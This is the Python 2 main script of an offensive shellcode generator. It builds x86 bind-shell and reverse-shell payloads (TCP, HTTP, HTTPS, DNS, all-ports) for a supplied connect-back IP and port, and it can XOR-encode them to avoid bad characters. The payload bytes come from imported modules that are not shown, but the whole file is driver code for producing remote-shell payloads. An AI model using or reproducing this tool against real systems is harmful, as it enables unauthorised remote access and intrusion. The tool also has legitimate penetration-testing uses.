#!/usr/bin/env python

import argparse
import socket
import sys
from encoders import xor
from payloads.x86 import bind_tcp
from payloads.x86 import rev_tcp
from payloads.x86 import rev_tcp_dns
from payloads.x86 import rev_https
from payloads.x86 import rev_http
from payloads.x86 import rev_tcp_all_ports


def cli_parser():

    # Command line argument parser
    parser = argparse.ArgumentParser(
        add_help=False,
        description="Ordnance disposal!")
    parser.add_argument(
        '-h', '-?', '--h', '-help', '--help', action="store_true",
        help=argparse.SUPPRESS)

    shell_in = parser.add_argument_group('Shellcode Generation Options')
    shell_in.add_argument(
        "-p", "--payload", metavar="Payload Type", default=None,
        help="Payload type (bind_tcp or rev_tcp)")
    shell_in.add_argument(
        "--ip", "--domain", metavar="IP Address", default=None,
        help="IP Address to connect back to")
    shell_in.add_argument(
        '--port', metavar="Port Number", default=4444, type=int,
        help="Port number to connect to.")
    shell_in.add_argument(
        '--list-payloads', default=False, action='store_true',
        help="Lists all available payloads.")

    shell_in = parser.add_argument_group('Encoder Options')
    shell_in.add_argument(
        "-e", "--encoder", metavar="Encoder Name", default=None,
        help="Name of Shellcode Encoder to use")
    shell_in.add_argument(
        "-b", "--bad-chars", metavar="\\x00\\x0a..", default=None,
        help="Bad characters to avoid")
    shell_in.add_argument(
        '--list-encoders', default=False, action='store_true',
        help="Lists all available encoders.")
    shell_in.add_argument(
        '--print-stats', default=False, action='store_true',
        help="Print information about the encoded shellcode.")

    args = parser.parse_args()

    # If you don't give any cli options, display help menu
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit()

    if args.h:
        parser.print_help()
        sys.exit()

    if args.list_payloads:
        print "[*] Available Payloads/Stagers:"
        print "\t* bind_tcp"
        print "\t* rev_tcp"
        print "\t* rev_https"
        print "\t* rev_http"
        print "\t* rev_tcp_dns"
        print "\t* rev_tcp_all_ports"
        sys.exit()

    if args.list_encoders:
        print "[*] Available Encoders:"
        print "\t* xor"
        sys.exit()

    # Checks if you have a payload set, and if not, to error out
    if args.payload == None:
        print "[*] Error: Please select a payload to generate!"
        sys.exit()

    # Checks to make sure you specify an IP address unless using a bind payload
    if args.ip == None and args.payload.lower() != "bind_tcp":
        print "[*] Error: Please provide an IP address!"
        sys.exit()

    # Checks to make sure a valid port is used
    if 0 < args.port < 65536:
        pass
    else:
        print "[*] Error: You did not provide a valid port number!"
        print "[*] Error: Please provide a number between 1-65535!"
        sys.exit()

    if args.encoder is not None:
        if args.encoder.lower() == "xor":
            pass
        else:
            print "[*] Error: Please provide a select/use a valid encoder!"
            sys.exit()

    # Checks to make sure if you are using an encoder, to supply bad characters
    if args.encoder is not None and args.bad_chars is None:
        print "[*] Error: Please provide bad characters to avoid with the encoder."
        print "[*] Error: If no bad characters, please re-run without using an encoder."
        sys.exit()

    return args

if __name__ == "__main__":

    cli_parsed = cli_parser()

    if cli_parsed.payload.lower() == "bind_tcp":

        # Instantiate the bind_tcp payload object
        bind_payload = bind_tcp.BindTCP()

        # Set the required attributes, in this case, just the lport
        bind_payload.set_attrs(cli_parsed.port)

        # Generate the shellcode
        bind_payload.gen_shellcode()

        if cli_parsed.bad_chars is not None and cli_parsed.encoder is not None:
            # Set Encoder Information
            if cli_parsed.encoder.lower() == "xor":
                single_xor_encoder = xor.SingleXorEncoder()

                # Get the shellcode into the encoder
                single_xor_encoder.set_shellcode(bind_payload.customized_shellcode)

                # Set the bad characters
                single_xor_encoder.set_bad_characters(cli_parsed.bad_chars)

                # Encode the shellcode
                single_xor_encoder.do_the_magic()

                if cli_parsed.print_stats:
                    single_xor_encoder.all_the_stats(cli_parsed)

                # Print the encoded shellcode
                print single_xor_encoder.encoded_shellcode

        else:
            if cli_parsed.print_stats:
                bind_payload.payload_stats(cli_parsed)

            bind_payload.print_shellcode()

    elif cli_parsed.payload.lower() == "rev_tcp":

        # Instantiate the reverse_tcp payload object
        rev_payload = rev_tcp.RevTCP()

        # Set the required attributes (IP and port)
        rev_payload.set_attrs(cli_parsed.port, cli_parsed.ip)

        # Generate the shellcode
        rev_payload.gen_shellcode()

        if cli_parsed.bad_chars is not None and cli_parsed.encoder is not None:
            # Set Encoder Information
            if cli_parsed.encoder.lower() == "xor":
                single_xor_encoder = xor.SingleXorEncoder()

                # Get the shellcode into the encoder
                single_xor_encoder.set_shellcode(rev_payload.customized_shellcode)

                # Set the bad characters
                single_xor_encoder.set_bad_characters(cli_parsed.bad_chars)

                # Encode the shellcode
                single_xor_encoder.do_the_magic()

                if cli_parsed.print_stats:
                    single_xor_encoder.all_the_stats(cli_parsed)

                # Print the encoded shellcode
                print single_xor_encoder.encoded_shellcode

        else:
            if cli_parsed.print_stats:
                rev_payload.payload_stats(cli_parsed)

            rev_payload.print_shellcode()

    elif cli_parsed.payload.lower() == "rev_https":

        # Instantiate the reverse_https payload object
        rev_https_payload = rev_https.RevHTTPS()

        # Set the required attributes
        rev_https_payload.set_attrs(cli_parsed.port, cli_parsed.ip)

        # Generate the shellcode
        rev_https_payload.gen_shellcode()

        if cli_parsed.bad_chars is not None and cli_parsed.encoder is not None:
            # Set Encoder Information
            if cli_parsed.encoder.lower() == "xor":
                single_xor_encoder = xor.SingleXorEncoder()

                # Get the shellcode into the encoder
                single_xor_encoder.set_shellcode(rev_https_payload.customized_shellcode)

                # Set the bad characters
                single_xor_encoder.set_bad_characters(cli_parsed.bad_chars)

                # Encode the shellcode
                single_xor_encoder.do_the_magic()

                if cli_parsed.print_stats:
                    single_xor_encoder.all_the_stats(cli_parsed)

                # Print the encoded shellcode
                print single_xor_encoder.encoded_shellcode

        else:
            if cli_parsed.print_stats:
                rev_https_payload.payload_stats(cli_parsed)

            rev_https_payload.print_shellcode()

    elif cli_parsed.payload.lower() == "rev_http":

        # Instantiate the reverse http payload object
        rev_http_payload = rev_http.RevHTTP()

        # Set the required attributes
        rev_http_payload.set_attrs(cli_parsed.port, cli_parsed.ip)

        # Generate the shellcode
        rev_http_payload.gen_shellcode()

        if cli_parsed.bad_chars is not None and cli_parsed.encoder is not None:
            # Set Encoder Information
            if cli_parsed.encoder.lower() == "xor":
                single_xor_encoder = xor.SingleXorEncoder()

                # Get the shellcode into the encoder
                single_xor_encoder.set_shellcode(rev_http_payload.customized_shellcode)

                # Set the bad characters
                single_xor_encoder.set_bad_characters(cli_parsed.bad_chars)

                # Encode the shellcode
                single_xor_encoder.do_the_magic()

                if cli_parsed.print_stats:
                    single_xor_encoder.all_the_stats(cli_parsed)

                # Print the encoded shellcode
                print single_xor_encoder.encoded_shellcode

        else:
            if cli_parsed.print_stats:
                rev_http_payload.payload_stats(cli_parsed)

            rev_http_payload.print_shellcode()


    elif cli_parsed.payload.lower() == "rev_tcp_dns":

        # Instantiate the reverse tcp dns payload object
        rev_tcp_dns = rev_tcp_dns.RevTCPDNS()

        # Set the required attributes
        rev_tcp_dns.set_attrs(cli_parsed.port, cli_parsed.ip)

        # Generate the shellcode
        rev_tcp_dns.gen_shellcode()

        if cli_parsed.bad_chars is not None and cli_parsed.encoder is not None:
            # Set Encoder Information
            if cli_parsed.encoder.lower() == "xor":
                single_xor_encoder = xor.SingleXorEncoder()

                # Get the shellcode into the encoder
                single_xor_encoder.set_shellcode(rev_tcp_dns.customized_shellcode)

                # Set the bad characters
                single_xor_encoder.set_bad_characters(cli_parsed.bad_chars)

                # Encode the shellcode
                single_xor_encoder.do_the_magic()

                if cli_parsed.print_stats:
                    single_xor_encoder.all_the_stats(cli_parsed)

                # Print the encoded shellcode
                print single_xor_encoder.encoded_shellcode

        else:
            if cli_parsed.print_stats:
                rev_tcp_dns.payload_stats(cli_parsed)

            rev_tcp_dns.print_shellcode()

    elif cli_parsed.payload.lower() == "rev_tcp_all_ports":

        # Instantiate the reverse tcp dns payload object
        rev_tcp_ap_payload = rev_tcp_all_ports.RevTCPAP()

        # Set the required attributes
        rev_tcp_ap_payload.set_attrs(cli_parsed.port, cli_parsed.ip)

        # Generate the shellcode
        rev_tcp_ap_payload.gen_shellcode()

        if cli_parsed.bad_chars is not None and cli_parsed.encoder is not None:
            # Set Encoder Information
            if cli_parsed.encoder.lower() == "xor":
                single_xor_encoder = xor.SingleXorEncoder()

                # Get the shellcode into the encoder
                single_xor_encoder.set_shellcode(rev_tcp_ap_payload.customized_shellcode)

                # Set the bad characters
                single_xor_encoder.set_bad_characters(cli_parsed.bad_chars)

                # Encode the shellcode
                single_xor_encoder.do_the_magic()

                if cli_parsed.print_stats:
                    single_xor_encoder.all_the_stats(cli_parsed)

                # Print the encoded shellcode
                print single_xor_encoder.encoded_shellcode

        else:
            if cli_parsed.print_stats:
                rev_tcp_ap_payload.payload_stats(cli_parsed)

            rev_tcp_ap_payload.print_shellcode()

    else:
        print "[*] Error: You didn't specify a valid payload to generate!"
        print "[*] Error: Please re-run and select a valid payload!"
        sys.exit()
